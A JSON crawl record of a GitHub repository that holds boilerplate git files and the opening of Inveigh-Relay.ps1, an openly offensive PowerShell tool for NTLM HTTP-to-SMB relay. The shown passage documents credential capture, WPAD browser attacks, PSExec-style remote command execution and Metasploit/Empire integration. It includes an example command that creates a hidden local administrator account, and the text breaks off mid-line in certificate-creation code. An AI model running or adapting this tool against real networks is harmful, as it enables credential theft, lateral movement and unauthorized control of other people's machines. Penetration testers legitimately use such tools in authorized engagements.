{
  "metadata": {
    "timestamp": 1736710830068,
    "page": 343,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjM1MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "Kevin-Robertson/Inveigh",
      "stars": 2615,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitattributes",
          "type": "blob",
          "size": 0.064453125,
          "content": "# Auto detect text files and perform LF normalization\n* text=auto\n"
        },
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 5.451171875,
          "content": "## Ignore Visual Studio temporary files, build results, and\n## files generated by popular Visual Studio add-ons.\n##\n## Get latest from https://github.com/github/gitignore/blob/master/VisualStudio.gitignore\n\n# User-specific files\n*.suo\n*.user\n*.userosscache\n*.sln.docstates\n\n# User-specific files (MonoDevelop/Xamarin Studio)\n*.userprefs\n\n# Build results\n[Dd]ebug/\n[Dd]ebugPublic/\n[Rr]elease/\n[Rr]eleases/\nx64/\nx86/\nbld/\n[Bb]in/\n[Oo]bj/\n[Ll]og/\n\n# Visual Studio 2015/2017 cache/options directory\n.vs/\n# Uncomment if you have tasks that create the project's static files in wwwroot\n#wwwroot/\n\n# Visual Studio 2017 auto generated files\nGenerated\\ Files/\n\n# MSTest test Results\n[Tt]est[Rr]esult*/\n[Bb]uild[Ll]og.*\n\n# NUNIT\n*.VisualState.xml\nTestResult.xml\n\n# Build Results of an ATL Project\n[Dd]ebugPS/\n[Rr]eleasePS/\ndlldata.c\n\n# Benchmark Results\nBenchmarkDotNet.Artifacts/\n\n# .NET Core\nproject.lock.json\nproject.fragment.lock.json\nartifacts/\n**/Properties/launchSettings.json\n\n# StyleCop\nStyleCopReport.xml\n\n# Files built by Visual Studio\n*_i.c\n*_p.c\n*_i.h\n*.ilk\n*.meta\n*.obj\n*.iobj\n*.pch\n*.pdb\n*.ipdb\n*.pgc\n*.pgd\n*.rsp\n*.sbr\n*.tlb\n*.tli\n*.tlh\n*.tmp\n*.tmp_proj\n*.log\n*.vspscc\n*.vssscc\n.builds\n*.pidb\n*.svclog\n*.scc\n\n# Chutzpah Test files\n_Chutzpah*\n\n# Visual C++ cache files\nipch/\n*.aps\n*.ncb\n*.opendb\n*.opensdf\n*.sdf\n*.cachefile\n*.VC.db\n*.VC.VC.opendb\n\n# Visual Studio profiler\n*.psess\n*.vsp\n*.vspx\n*.sap\n\n# Visual Studio Trace Files\n*.e2e\n\n# TFS 2012 Local Workspace\n$tf/\n\n# Guidance Automation Toolkit\n*.gpState\n\n# ReSharper is a .NET coding add-in\n_ReSharper*/\n*.[Rr]e[Ss]harper\n*.DotSettings.user\n\n# JustCode is a .NET coding add-in\n.JustCode\n\n# TeamCity is a build add-in\n_TeamCity*\n\n# DotCover is a Code Coverage Tool\n*.dotCover\n\n# AxoCover is a Code Coverage Tool\n.axoCover/*\n!.axoCover/settings.json\n\n# Visual Studio code coverage results\n*.coverage\n*.coveragexml\n\n# NCrunch\n_NCrunch_*\n.*crunch*.local.xml\nnCrunchTemp_*\n\n# MightyMoose\n*.mm.*\nAutoTest.Net/\n\n# Web workbench (sass)\n.sass-cache/\n\n# Installshield output folder\n[Ee]xpress/\n\n# DocProject is a documentation generator add-in\nDocProject/buildhelp/\nDocProject/Help/*.HxT\nDocProject/Help/*.HxC\nDocProject/Help/*.hhc\nDocProject/Help/*.hhk\nDocProject/Help/*.hhp\nDocProject/Help/Html2\nDocProject/Help/html\n\n# Click-Once directory\npublish/\n\n# Publish Web Output\n*.[Pp]ublish.xml\n*.azurePubxml\n# Note: Comment the next line if you want to checkin your web deploy settings,\n# but database connection strings (with potential passwords) will be unencrypted\n*.pubxml\n*.publishproj\n\n# Microsoft Azure Web App publish settings. Comment the next line if you want to\n# checkin your Azure Web App publish settings, but sensitive information contained\n# in these scripts will be unencrypted\nPublishScripts/\n\n# NuGet Packages\n*.nupkg\n# The packages folder can be ignored because of Package Restore\n**/[Pp]ackages/*\n# except build/, which is used as an MSBuild target.\n!**/[Pp]ackages/build/\n# Uncomment if necessary however generally it will be regenerated when needed\n#!**/[Pp]ackages/repositories.config\n# NuGet v3's project.json files produces more ignorable files\n*.nuget.props\n*.nuget.targets\n\n# Microsoft Azure Build Output\ncsx/\n*.build.csdef\n\n# Microsoft Azure Emulator\necf/\nrcf/\n\n# Windows Store app package directories and files\nAppPackages/\nBundleArtifacts/\nPackage.StoreAssociation.xml\n_pkginfo.txt\n*.appx\n\n# Visual Studio cache files\n# files ending in .cache can be ignored\n*.[Cc]ache\n# but keep track of directories ending in .cache\n!*.[Cc]ache/\n\n# Others\nClientBin/\n~$*\n*~\n*.dbmdl\n*.dbproj.schemaview\n*.jfm\n*.pfx\n*.publishsettings\norleans.codegen.cs\n\n# Including strong name files can present a security risk \n# (https://github.com/github/gitignore/pull/2483#issue-259490424)\n#*.snk\n\n# Since there are multiple workflows, uncomment next line to ignore bower_components\n# (https://github.com/github/gitignore/pull/1529#issuecomment-104372622)\n#bower_components/\n\n# RIA/Silverlight projects\nGenerated_Code/\n\n# Backup & report files from converting an old project file\n# to a newer Visual Studio version. Backup files are not needed,\n# because we have git ;-)\n_UpgradeReport_Files/\nBackup*/\nUpgradeLog*.XML\nUpgradeLog*.htm\nServiceFabricBackup/\n*.rptproj.bak\n\n# SQL Server files\n*.mdf\n*.ldf\n*.ndf\n\n# Business Intelligence projects\n*.rdl.data\n*.bim.layout\n*.bim_*.settings\n*.rptproj.rsuser\n\n# Microsoft Fakes\nFakesAssemblies/\n\n# GhostDoc plugin setting file\n*.GhostDoc.xml\n\n# Node.js Tools for Visual Studio\n.ntvs_analysis.dat\nnode_modules/\n\n# Visual Studio 6 build log\n*.plg\n\n# Visual Studio 6 workspace options file\n*.opt\n\n# Visual Studio 6 auto-generated workspace file (contains which files were open etc.)\n*.vbw\n\n# Visual Studio LightSwitch build output\n**/*.HTMLClient/GeneratedArtifacts\n**/*.DesktopClient/GeneratedArtifacts\n**/*.DesktopClient/ModelManifest.xml\n**/*.Server/GeneratedArtifacts\n**/*.Server/ModelManifest.xml\n_Pvt_Extensions\n\n# Paket dependency manager\n.paket/paket.exe\npaket-files/\n\n# FAKE - F# Make\n.fake/\n\n# JetBrains Rider\n.idea/\n*.sln.iml\n\n# CodeRush\n.cr/\n\n# Python Tools for Visual Studio (PTVS)\n__pycache__/\n*.pyc\n\n# Cake - Uncomment if you are using it\n# tools/**\n# !tools/packages.config\n\n# Tabs Studio\n*.tss\n\n# Telerik's JustMock configuration file\n*.jmconfig\n\n# BizTalk build output\n*.btp.cs\n*.btm.cs\n*.odx.cs\n*.xsd.cs\n\n# OpenCover UI analysis results\nOpenCover/\n\n# Azure Stream Analytics local run output \nASALocalRun/\n\n# MSBuild Binary and Structured Log\n*.binlog\n\n# NVidia Nsight GPU debugger configuration file\n*.nvuser\n\n# MFractors (Xamarin productivity tool) working folder \n.mfractor/\n"
        },
        {
          "name": "Inveigh-Relay.ps1",
          "type": "blob",
          "size": 340.9365234375,
          "content": "function Invoke-InveighRelay\n{\n<#\n.SYNOPSIS\nThis function performs NTLMv1/NTLMv2 HTTP to SMB relay.\n\n.DESCRIPTION\nThis function performs NTLMv1/NTLMv2 HTTP to SMB relay.\n\n.PARAMETER Attack\nDefault = Enumerate,Session: (Enumerate/Execute/Session) Comma seperated list of attacks to perform with relay. Enumerate\nleverages relay to perform enumeration on target systems. The collected data is used for target selection.\nExecute performs PSExec style command execution. Session creates and maintains authenticated SMB sessions that\ncan be interacted with through Invoke-TheHash's Invoke-SMBClient, Invoke-SMBEnum, and Invoke-SMBExec. \n\n.PARAMETER Challenge\nDefault = Random: 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random\nchallenge will be generated for each request. Note that during SMB relay attempts, the challenge will be\npulled from the SMB relay target. \n\n.PARAMETER Command\nCommand to execute on SMB relay target. Use PowerShell character escapes where necessary.\n\n.PARAMETER ConsoleOutput\nDefault = Disabled: (Low/Medium/Y/N) Enable/Disable real time console output. If using this option through a\nshell, test to ensure that it doesn't hang the shell. Medium and Low can be used to reduce output.\n\n.PARAMETER ConsoleQueueLimit\nDefault = Unlimited: Maximum number of queued up console log entries when not using the real time console.\n\n.PARAMETER ConsoleStatus\n(Integer) Interval in minutes for displaying all unique captured hashes and credentials. This is useful for\ndisplaying full capture lists when running through a shell that does not have access to the support functions.\n\n.PARAMETER ConsoleUnique\nDefault = Enabled: (Y/N) Enable/Disable displaying challenge/response hashes for only unique IP, domain/hostname,\nand username combinations when real time console output is enabled.\n\n.PARAMETER DomainMapping\nArray to map one netBIOS domain to one DNS domain. Needed when attacking a domain from a non-domain\nattached system with data imported from BloodHound.\n\n.PARAMETER Enumerate\nDefault = All: (All/Group/NetSession/Share/User) The action that will be used for the 'Enumerate' attack.\n\n.PARAMETER EnumerateGroup\nDefault = Administrators: The group that will be enumerated with the 'Enumerate' attack. Note that only the\n'Administrators' group will be used for targeting decisions.\n\n.PARAMETER FailedLoginStrict\nDefault = Disabled: If disabled, login attempts against non-domain attached will not count as failed logins. If enabled, all\nfailed logins will count.\n\n.PARAMETER FailedLoginThreshold\nDefault = 2: The threshold for failed logins. Once failed logins for a user exceed the threshold, further relay attempts for that\nuser will be stopped.\n\n.PARAMETER FileOutput\nDefault = Disabled: (Y/N) Enable/Disable real time file output.\n\n.PARAMETER FileOutputDirectory\nDefault = Working Directory: Valid path to an output directory for log and capture files. FileOutput must also be\nenabled.\n\n.PARAMETER HTTP\nDefault = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.\n\n.PARAMETER HTTPIP\nDefault = Any: IP address for the HTTP/HTTPS listener.\n\n.PARAMETER HTTPPort\nDefault = 80: TCP port for the HTTP listener.\n\n.PARAMETER HTTPS\nDefault = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in\nthe local store. If the script does not exit gracefully, manually remove the certificate. This feature requires\nlocal administrator access.\n\n.PARAMETER HTTPSPort\nDefault = 443: TCP port for the HTTPS listener.\n\n.PARAMETER HTTPSCertIssuer\nDefault = Inveigh: The issuer field for the cert that will be installed for HTTPS.\n\n.PARAMETER HTTPSCertSubject\nDefault = localhost: The subject field for the cert that will be installed for HTTPS.\n\n.PARAMETER HTTPSForceCertDelete\nDefault = Disabled: (Y/N) Force deletion of an existing certificate that matches HTTPSCertIssuer and\nHTTPSCertSubject.\n\n.PARAMETER LogOutput\nDefault = Enabled: (Y/N) Enable/Disable storing log messages in memory.\n\n.PARAMETER MachineAccounts\nDefault = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.\n\n.PARAMETER OutputStreamOnly\nDefault = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if\nrunning Inveigh Relay through a shell that does not return other output streams. Note that you will not see the\nvarious yellow warning messages if enabled.\n\n.PARAMETER ProxyIP\nDefault = Any: IP address for the proxy listener.\n\n.PARAMETER ProxyPort\nDefault = 8492: TCP port for the proxy listener.\n\n.PARAMETER ProxyIgnore\nDefault = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers\nwill not be sent the wpad.dat file used for capturing proxy authentications. Firefox does not work correctly\nwith the proxy server failover setup. Firefox will be left unable to connect to any sites until the proxy is\ncleared. Remove \"Firefox\" from this list to attack Firefox. If attacking Firefox, consider setting\n-SpooferRepeat N to limit attacks against a single target so that victims can recover Firefox connectivity by\nclosing and reopening.\n\n.PARAMETER RelayAutoDisable\nDefault = Enable: (Y/N) Enable/Disable automatically disabling SMB relay after a successful command execution on\ntarget.\n\n.PARAMETER RelayAutoExit\nDefault = Enable: (Y/N) Enable/Disable automatically exiting after a relay is disabled due to success or error.\n\n.PARAMETER RepeatEnumerate\nDefault = 30 Minutes: The minimum number of minutes to wait between enumeration attempts for a target.\n\n.PARAMETER RepeatExecute\nDefault = 30 Minutes: The minimum number of minutes to wait between command execution attempts for a target. \n\n.PARAMETER RunTime\n(Integer) Run time duration in minutes.\n\n.PARAMETER Service\nDefault = 20 Character Random: Name of the service to create and delete on the target.\n\n.PARAMETER SessionLimitPriv\nDefault = 2: Limit of privileged sessions on a target.\n\n.PARAMETER SessionLimitShare\nDefault = 2: Limit of sessions per user for targets hosting custom shares.\n\n.PARAMETER SessionLimitUnpriv\nDefault = 0: Limit of unprivileged sessions on a target.\n\n.PARAMETER SessionRefresh\nDefault = 10 Minutes: The number of minutes between refreshes to keep sessions from timing out.\n\n.PARAMETER ShowHelp\nDefault = Enabled: (Y/N) Enable/Disable the help messages at startup.\n\n.PARAMETER StartupChecks\nDefault = Enabled: (Y/N) Enable/Disable checks for in use ports and running services on startup.\n\n.PARAMETER StatusOutput\nDefault = Enabled: (Y/N) Enable/Disable startup and shutdown messages.\n\n.PARAMETER Target\nComma separated list of IP addresses to target for relay. This parameter will accept single addresses, CIDR, or\nranges on the format of 192.168.0.1-192.168.0.10 or 192.168.0.1-10. Avoid using large ranges with lots of unused\nIP addresses or systems not running SMB. Inveigh-Relay will do quick port checks as part of target selection and\nfilter out invalid targets. Something like a /16 with only a few hosts isn't really practical though.\n\n.PARAMETER TargetExclude\nComma separated list of IP addresses to exlude from the target list. This parameter will accept the same formats as\nthe 'Target' parameter.\n\n.PARAMETER TargetMode\nDefault = Random: (Random/Strict) 'Random' target mode will fall back to selecting a random target is a match\nisn't found through enumerated data. 'Strict' will only select targets through enumerated data. Note that\n'Strict' requires either previously collected data from the 'Enumerate' attack or data imported from\nBloodHound.\n\n.PARAMETER TargetRandom\nDefault = Enabled: (Y/N) Enable/Disable selecting a random target if a target is not found through logic.\n\n.PARAMETER TargetRefresh\nDefault = 60 Minutes: Number of minutes to wait before rechecking a target for eligibility.\n\n.PARAMETER Tool\nDefault = 0: (0/1/2) Enable/Disable features for better operation through external tools such as Meterpreter's\nPowerShell extension, Metasploit's Interactive PowerShell Sessions payloads and Empire.\n0 = None, 1 = Metasploit/Meterpreter, 2 = Empire \n\n.PARAMETER Username\nDefault = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and\ndomain\\username format. \n\n.PARAMETER WPADAuth\nDefault = NTLM: (Anonymous/NTLM) HTTP/HTTPS server authentication type for wpad.dat requests. Setting to\nAnonymous can prevent browser login prompts.\n\n.PARAMETER WPADAuthIgnore\nDefault = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers\nwill be skipped for NTLM authentication. This can be used to filter out browsers like Firefox that display login\npopups for authenticated wpad.dat requests such as Firefox.  \n\n.EXAMPLE\nInvoke-Inveigh -HTTP N\nInvoke-InveighRelay -Target 192.168.2.55 -Command \"net user Inveigh Spring2017 /add && net localgroup administrators Inveigh /add\"\n\n.LINK\nhttps://github.com/Kevin-Robertson/Inveigh\n#>\n\n#region begin parameters\n\n# Parameter default values can be modified in this section:\n\n[CmdletBinding()]\nparam\n( \n    [parameter(Mandatory=$false)][ValidateSet(\"Enumerate\",\"Session\",\"Execute\")][Array]$Attack = (\"Enumerate\",\"Session\"),\n    [parameter(Mandatory=$false)][ValidateSet(\"All\",\"NetSession\",\"Share\",\"User\",\"Group\")][String]$Enumerate = \"All\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Random\",\"Strict\")][String]$TargetMode = \"Random\",\n    [parameter(Mandatory=$false)][String]$EnumerateGroup = \"Administrators\",\n    [parameter(Mandatory=$false)][Array]$DomainMapping = \"\",\n    [parameter(Mandatory=$false)][Array]$Target = \"\",\n    [parameter(Mandatory=$false)][Array]$TargetExclude = \"\",\n    [parameter(Mandatory=$false)][Array]$ProxyIgnore = \"Firefox\",\n    [parameter(Mandatory=$false)][Array]$Username = \"\",\n    [parameter(Mandatory=$false)][Array]$WPADAuthIgnore = \"\",\n    [parameter(Mandatory=$false)][Int]$ConsoleQueueLimit = \"-1\",\n    [parameter(Mandatory=$false)][Int]$ConsoleStatus = \"\",\n    [parameter(Mandatory=$false)][Int]$FailedLoginThreshold = \"2\",\n    [parameter(Mandatory=$false)][Int]$HTTPPort = \"80\",\n    [parameter(Mandatory=$false)][Int]$HTTPSPort = \"443\",\n    [parameter(Mandatory=$false)][Int]$ProxyPort = \"8492\",\n    [parameter(Mandatory=$false)][Int]$RunTime = \"\",\n    [parameter(Mandatory=$false)][Int]$SessionLimitPriv = \"2\",\n    [parameter(Mandatory=$false)][Int]$SessionLimitShare = \"2\",\n    [parameter(Mandatory=$false)][Int]$SessionLimitUnpriv = \"0\",\n    [parameter(Mandatory=$false)][Int]$SessionRefresh = \"10\",\n    [parameter(Mandatory=$false)][Int]$TargetRefresh = \"60\",\n    [parameter(Mandatory=$false)][Int]$RepeatEnumerate = \"30\",\n    [parameter(Mandatory=$false)][Int]$RepeatExecute = \"30\",\n    [parameter(Mandatory=$false)][String]$Command = \"\",\n    [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = \"Inveigh\",\n    [parameter(Mandatory=$false)][String]$HTTPSCertSubject = \"localhost\",\n    [parameter(Mandatory=$false)][String]$Service,\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$ConsoleUnique = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$FailedLoginStrict = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$FileOutput = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$FileUnique = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$HTTP = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$HTTPS = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$HTTPSForceCertDelete = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$LogOutput = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$MachineAccounts = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$OutputStreamOnly = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$Proxy = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$RelayAutoDisable = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$RelayAutoExit = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$SessionPriority = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$ShowHelp = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$StartupChecks = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\")][String]$StatusOutput = \"Y\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Y\",\"N\",\"Low\",\"Medium\")][String]$ConsoleOutput = \"N\",\n    [parameter(Mandatory=$false)][ValidateSet(\"0\",\"1\",\"2\")][String]$Tool = \"0\",\n    [parameter(Mandatory=$false)][ValidateSet(\"Anonymous\",\"NTLM\")][String]$WPADAuth = \"NTLM\",\n    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = \"\",\n    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = \"\",\n    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = \"0.0.0.0\",\n    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = \"0.0.0.0\",\n    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter\n)\n\n#endregion\n#region begin initialization\n\nif ($invalid_parameter)\n{\n    Write-Output \"[-] $($invalid_parameter) is not a valid parameter.\"\n    throw\n}\n\nif($inveigh.relay_running)\n{\n    Write-Output \"[-] Inveigh Relay is already running\"\n    throw\n}\n\n$inveigh_version = \"1.501\"\n\nif(!$target -and !$inveigh.enumerate)\n{\n    Write-Output \"[-] No enumerated target data, specify targets with -Target\"\n    throw\n}\n\nif($ProxyIP -eq '0.0.0.0')\n{\n\n    try\n    {\n        $proxy_WPAD_IP = (Test-Connection 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)\n    }\n    catch\n    {\n        Write-Output \"[-] Error finding proxy IP, specify manually with -ProxyIP\"\n        throw\n    }\n\n}\n\nif($Attack -contains 'Execute' -and !$Command)\n{\n    Write-Output \"[-] -Command required with -Attack Execute\"\n    throw\n}\n\nif($DomainMapping)\n{\n\n    if($DomainMapping.Count -ne 2 -or $DomainMapping[0] -like \"*.*\" -or $DomainMapping[1] -notlike \"*.*\")\n    {\n        Write-Output \"[-] -DomainMapping format is incorrect\"\n        throw\n    }\n    \n}\n\nif(!$FileOutputDirectory)\n{ \n    $output_directory = $PWD.Path\n}\nelse\n{\n    $output_directory = $FileOutputDirectory\n}\n\nif(!$inveigh)\n{\n    $global:inveigh = [HashTable]::Synchronized(@{})\n    $inveigh.cleartext_list = New-Object System.Collections.ArrayList\n    $inveigh.enumerate = New-Object System.Collections.ArrayList\n    $inveigh.IP_capture_list = New-Object System.Collections.ArrayList\n    $inveigh.log = New-Object System.Collections.ArrayList\n    $inveigh.kerberos_TGT_list = New-Object System.Collections.ArrayList\n    $inveigh.kerberos_TGT_username_list = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv2_username_list = New-Object System.Collections.ArrayList\n    $inveigh.POST_request_list = New-Object System.Collections.ArrayList\n    $inveigh.valid_host_list = New-Object System.Collections.ArrayList\n    $inveigh.ADIDNS_table = [HashTable]::Synchronized(@{})\n    $inveigh.relay_privilege_table = [HashTable]::Synchronized(@{})\n    $inveigh.relay_failed_login_table = [HashTable]::Synchronized(@{})\n    $inveigh.relay_history_table = [HashTable]::Synchronized(@{})\n    $inveigh.request_table = [HashTable]::Synchronized(@{})\n    $inveigh.session_socket_table = [HashTable]::Synchronized(@{})\n    $inveigh.session_table = [HashTable]::Synchronized(@{})\n    $inveigh.session_message_ID_table = [HashTable]::Synchronized(@{})\n    $inveigh.session_lock_table = [HashTable]::Synchronized(@{})\n    $inveigh.SMB_session_table = [HashTable]::Synchronized(@{})\n    $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})\n    $inveigh.group_table = [HashTable]::Synchronized(@{})\n    $inveigh.session_count = 0\n    $inveigh.session = @()\n}\n\n$inveigh.stop = $false\n\nif(!$inveigh.running)\n{\n    $inveigh.cleartext_file_queue = New-Object System.Collections.ArrayList\n    $inveigh.console_queue = New-Object System.Collections.ArrayList\n    $inveigh.log_file_queue = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList\n    $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList\n    $inveigh.output_queue = New-Object System.Collections.ArrayList\n    $inveigh.POST_request_file_queue = New-Object System.Collections.ArrayList\n    $inveigh.HTTP_session_table = [HashTable]::Synchronized(@{})\n    $inveigh.console_input = $true\n    $inveigh.console_output = $false\n    $inveigh.file_output = $false\n    $inveigh.HTTPS_existing_certificate = $false\n    $inveigh.HTTPS_force_certificate_delete = $false\n    $inveigh.log_output = $true\n    $inveigh.cleartext_out_file = $output_directory + \"\\Inveigh-Cleartext.txt\"\n    $inveigh.log_out_file = $output_directory + \"\\Inveigh-Log.txt\"\n    $inveigh.NTLMv1_out_file = $output_directory + \"\\Inveigh-NTLMv1.txt\"\n    $inveigh.NTLMv2_out_file = $output_directory + \"\\Inveigh-NTLMv2.txt\"\n    $inveigh.POST_request_out_file = $output_directory + \"\\Inveigh-FormInput.txt\"\n}\n\nif($StartupChecks -eq 'Y')\n{\n\n    $firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}\n\n    if($HTTP -eq 'Y')\n    {\n        $HTTP_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:\"$HTTPIP`:$HTTPPort \"\n    }\n\n    if($HTTPS -eq 'Y')\n    {\n        $HTTPS_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:\"$HTTPIP`:$HTTPSPort \"\n    }\n\n    if($Proxy -eq 'Y')\n    {\n        $proxy_port_check = netstat -anp TCP | findstr LISTENING | findstr /C:\"$HTTPIP`:$ProxyPort \"\n    }\n\n}\n\n$inveigh.relay_running = $true\n$inveigh.SMB_relay = $true\n\nif($StatusOutput -eq 'Y')\n{\n    $inveigh.status_output = $true\n}\nelse\n{\n    $inveigh.status_output = $false\n}\n\nif($OutputStreamOnly -eq 'Y')\n{\n    $inveigh.output_stream_only = $true\n}\nelse\n{\n    $inveigh.output_stream_only = $false\n}\n\nif($Tool -eq 1) # Metasploit Interactive PowerShell Payloads and Meterpreter's PowerShell Extension\n{\n    $inveigh.tool = 1\n    $inveigh.output_stream_only = $true\n    $inveigh.newline = $null\n    $ConsoleOutput = \"N\"\n}\nelseif($Tool -eq 2) # PowerShell Empire\n{\n    $inveigh.tool = 2\n    $inveigh.output_stream_only = $true\n    $inveigh.console_input = $false\n    $inveigh.newline = $null\n    $LogOutput = \"N\"\n    $ShowHelp = \"N\"\n\n    switch ($ConsoleOutput)\n    {\n\n        'Low'\n        {\n            $ConsoleOutput = \"Low\"\n        }\n\n        'Medium'\n        {\n            $ConsoleOutput = \"Medium\"\n        }\n\n        default\n        {\n            $ConsoleOutput = \"Y\"\n        }\n\n    }\n\n}\nelse\n{\n    $inveigh.tool = 0\n    $inveigh.newline = $null\n}\n\n#endregion\n#region begin startup messages\n$inveigh.output_queue.Add(\"[*] Inveigh Relay $inveigh_version started at $(Get-Date -format s)\") > $null\n\nif($firewall_status)\n{\n    $inveigh.output_queue.Add(\"[!] Windows Firewall = Enabled\")  > $null\n}\n\nif($HTTP -eq 'Y')\n{\n\n    if($HTTP_port_check)\n    {\n        $HTTP = \"N\"\n        $inveigh.output_queue.Add(\"[-] HTTP Capture/Relay Disabled Due To In Use Port $HTTPPort\")  > $null\n    }\n    else\n    {\n        $inveigh.output_queue.Add(\"[+] HTTP Capture/Relay = Enabled\")  > $null\n\n        if($HTTPIP)\n        {\n            $inveigh.output_queue.Add(\"[+] HTTP IP Address = $HTTPIP\") > $null\n        }\n\n        if($HTTPPort -ne 80)\n        {\n            $inveigh.output_queue.Add(\"[+] HTTP Port = $HTTPPort\") > $null\n        }\n    }\n\n}\nelse\n{\n    $inveigh.output_queue.Add(\"[+] HTTP Capture/Relay = Disabled\")  > $null\n}\n\nif($HTTPS -eq 'Y')\n{\n\n    if($HTTPS_port_check)\n    {\n        $HTTPS = \"N\"\n        $inveigh.HTTPS = $false\n        $inveigh.output_queue.Add(\"[-] HTTPS Capture/Relay Disabled Due To In Use Port $HTTPSPort\")  > $null\n    }\n    else\n    {\n\n        try\n        {\n            $inveigh.certificate_issuer = $HTTPSCertIssuer\n            $inveigh.certificate_CN = $HTTPSCertSubject\n            $inveigh.output_queue.Add(\"[+] HTTPS Certificate Issuer = \" + $inveigh.certificate_issuer)  > $null\n            $inveigh.output_queue.Add(\"[+] HTTPS Certificate CN = \" + $inveigh.certificate_CN)  > $null\n            $certificate_check = (Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {$_.Issuer -match $inveigh.certificate_issuer})\n\n            if(!$certificate_check)\n            {\n                # credit to subTee for cert creation code from Interceptor\n                $certificate_distinguished_name = new-object -com \"X509Enrollment.CX500DistinguishedName\"\n                $certificate_distinguished_name.Encode( \"CN=\" + $inveigh.certificate_CN, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)\n                $certificate_issuer_distinguished_name = new-object -com \"X509Enrollment.CX500DistinguishedName\"\n                $certificate_issuer_distinguished_name.Encode(\"CN=\" + $inveigh.certificate_issuer, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)\n                $certificate_key = new-object -com \"X509Enrollment.CX509PrivateKey\"\n                $certificate_key.ProviderName = \"Microsoft Enhanced RSA and AES Cryptographic Provider\"\n                $certificate_key.KeySpec = 2\n                $certificate_key.Length = 2048\n\t\t\t    $certificate_key.MachineContext = 1\n                $certificate_key.Create()\n                $certificate_server_auth_OID = new-object -com \"X509Enrollment.CObjectId\"\n\t\t\t    $certificate_server_auth_OID.InitializeFromValue(\"1.3.6.1.5.5.7.3.1\")\n\t\t\t    $certificate_enhanced_key_usage_OID = new-object -com \"X509Enrollment.CObjectIds.1\"\n\t\t\t    $certificate_enhanced_key_usage_OID.add($certificate_server_auth_OID)\n\t\t\t    $certificate_enhanced_key_usage_extension = new-object -com \"X509Enrollment.CX509ExtensionEnhancedKeyUsage\"\n\t\t\t    $certificate_enhanced_key_usage_extension.InitializeEncode($certificate_enhanced_key_usage_OID)\n\t\t\t    $certificate = new-object -com \"X509Enrollment.CX509CertificateRequestCertificate\"\n\t\t\t    $certificate.InitializeFromPrivateKey(2,$certificate_key,\"\")\n\t\t\t    $certificate.Subject = $certificate_distinguished_name\n\t\t\t    $certificate.Issuer = $certificate_issuer_distinguished_name\n\t\t\t    $certificate.NotBefore = (get-date).AddDays(-271)\n\t\t\t    $certificate.NotAfter = $certificate.NotBefore.AddDays(824)\n\t\t\t    $certificate_hash_algorithm_OID = New-Object -ComObject X509Enrollment.CObjectId\n\t\t\t    $certificate_hash_algorithm_OID.InitializeFromAlgorithmName(1,0,0,\"SHA256\")\n\t\t\t    $certificate.HashAlgorithm = $certificate_hash_algorithm_OID\n                $certificate.X509Extensions.Add($certificate_enhanced_key_usage_extension)\n                $certificate_basic_constraints 